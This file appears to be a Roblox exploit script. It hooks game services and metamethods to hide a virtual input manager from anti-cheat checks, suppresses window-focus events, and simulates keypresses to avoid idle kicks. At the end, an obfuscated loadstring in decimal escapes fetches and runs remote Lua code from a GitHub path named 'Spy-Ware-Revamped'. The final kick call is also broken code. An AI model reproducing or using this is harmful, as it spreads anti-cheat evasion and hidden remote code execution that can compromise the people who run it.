local VirtualInputManager = Instance.new("VirtualInputManager")
local UserInputService = game:GetService("UserInputService")
local Hooks = {}

local function TrueString(String)
    if type(String) ~= "string" then
        return false
    end

    return (string.split(String, "\0"))[1]
end

local function SortArguments(self, ...)
    return self, {...}
end

local function hookGetSerivce(...)
    local OldGetService; OldGetService = function(...)
        local self, Index = ...
        local Response = OldGetService(...)
    
        if type(Index) == "string" and TrueString(Index) == "VirtualInputManager" then
            error(("'%s' is not a valid Service name"):format(TrueString(Index)))
            return;
        end
    
        return Response
    end
end

local OldFindService = hookfunction(game.FindService, function(...)
    local self, Index = ...
    local Response = OldFindService(...)

    if type(Index) == "string" and TrueString(Index) == "VirtualInputManager" then
        return;
    end

    return Response
end)

hookGetSerivce(game.GetService)
hookGetSerivce(game.getService)
hookGetSerivce(game.service)

local OldNamecall; OldNamecall = hookmetamethod(game, "__namecall", function(...)
    local self, Arguments = SortArguments(...)
    local Method = getnamecallmethod()

    if typeof(self) == "Instance" and self == game and Method:lower():match("service") and TrueString(Arguments[1]) == "VirtualInputManager" then
        if Method == "FindService" then
            return;
        end

        local Success, Error = pcall(function()
            setnamecallmethod(Method)
            game[Method](game, "VirtualFuckOff")
        end)

        if not Error:match("is not a valid member") then
            error(Error:replace("VirtualFuckOff", "VirtualInputManager"))
            return;
        end
    end

    return OldNamecall(...)
end)

local OldWindow; OldWindow = hookmetamethod(UserInputService.WindowFocused, "__index", function(...)
    local self, Index = ...
    local Response = OldWindow(...)

    if type(Response) ~= "function" and (tostring(self):find("WindowFocused") or tostring(self):find("WindowFocusReleased")) and not table.find(Hooks, Response) then
        table.insert(Hooks, Response)

        if Index:lower() == "wait" then
            local Old2; Old2 = hookfunction(Response, function(...)
                local self1 = ...

                if self1 == self then
                    self1 = Instance.new("BindableEvent").Event
                end

                return Old2(self1)
            end)
        elseif Index:lower() == "connect" then
            local Old2; Old2 = hookfunction(Response, function(...)
                local self1, Function = ...

                if self1 == self then
                    Function = function() return; end
                end

                return Old2(self1, Function)
            end)
        end
    end

    return Response
end)

for i, v in next, getconnections(UserInputService.WindowFocusReleased) do
    v:Disable()
end

for i, v in next, getconnections(UserInputService.WindowFocused) do
    v:Disable()
end

if not iswindowactive() and not getgenv().WindowFocused then
    firesignal(UserInputService.WindowFocused)
    getgenv().WindowFocused = true
end

while true do
    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Unknown, false, game)

    task.wait(Random.new():NextNumber(15, 120))
end
local plr = game.Players.LocalPlayer.Name
local plrid = game.Players.LocalPlayer.UserId
if game.PlaceId == 10449761463 then
  print("The Strongest Battlegrounds")
  loadstring('\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\67\114\121\112\116\101\100\69\120\47\83\112\121\45\87\97\114\101\45\82\101\118\97\109\112\101\100\47\109\97\105\110\47\71\97\109\101\115\47\84\104\101\37\50\48\83\116\114\111\110\103\101\115\116\37\50\48\66\97\116\116\108\101\103\114\111\117\110\100\115\46\108\117\97\34\41\41\40\41')()
else
  plr:kick("Wrong game dummy.")
  end;
